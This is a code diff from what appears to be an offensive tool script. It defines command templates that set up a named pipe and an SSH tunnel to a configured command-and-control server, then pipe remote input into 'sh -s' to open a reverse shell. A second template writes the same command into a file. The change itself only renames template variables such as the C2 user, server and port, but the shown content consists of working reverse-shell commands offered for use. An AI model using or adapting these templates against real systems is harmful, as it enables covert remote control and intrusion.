@@ -15,29 +15,33 @@ from reverse_shell_management import ReverseShellManager
 MKFIFO = 'SH mkfifo $FIFONAME; chmod 600 $FIFONAME'
 
 REVERSE_SH_SSH_TO_FILE = '''SH echo '
-ssh -i $KEYNAME $CCU@$CCS -p $CCP
+ssh -i $KEYNAME
+-l $CCUSER
+$CCSERVER
+-p $CCPORT
 -o UserKnownHostsFile=$KNOWNHOSTSFILE
 -o StrictHostKeyChecking=yes
 -N
 -W $NCIP:$NCP
 < $FIFONAME |
 sh -s > $FIFONAME 2>&1
-& echo $STARTSEND 
+& echo $STARTSEND
 > $FIFONAME
 ' > $TESTPATH
 '''
 
 REVERSE_SH_SSH = '''SH sh -c '
-ssh -i $KEYNAME 
-$CCU@$CCS 
--p $CCP 
--o UserKnownHostsFile=$KNOWNHOSTSFILE 
--o StrictHostKeyChecking=yes 
--N 
--W $NCIP:$NCP 
-< $FIFONAME | 
+ssh -i $KEYNAME
+-l $CCUSER
+$CCSERVER
+-p $CCPORT
+-o UserKnownHostsFile=$KNOWNHOSTSFILE
+-o StrictHostKeyChecking=yes
+-N
+-W $NCIP:$NCP
+< $FIFONAME |
 sh -s > $FIFONAME 2>&1
-& echo $STARTSEND 
+& echo $STARTSEND
 > $FIFONAME
 '
 '''
@@ -160,9 +164,9 @@ if __name__ == '__main__':
     ssh_step = Template(ssh_command).substitute(FIFONAME=ftpfifoname,
                                                 KEYNAME=ftpkeyname,
                                                 KNOWNHOSTSFILE=ftpknownhosts,
-                                                CCU=config['cc_user'],
-                                                CCS=config['cc_server'],
-                                                CCP=config['cc_port'],
+                                                CCUSER=config['cc_user'],
+                                                CCSERVER=config['cc_server'],
+                                                CCPORT=config['cc_port'],
                                                 NCIP=config['ebcdiccat_host'],
                                                 NCP=config['ebcdiccat_port'],
                                                 STARTSEND=ReverseShellManager.TERMINATOR_STRING,
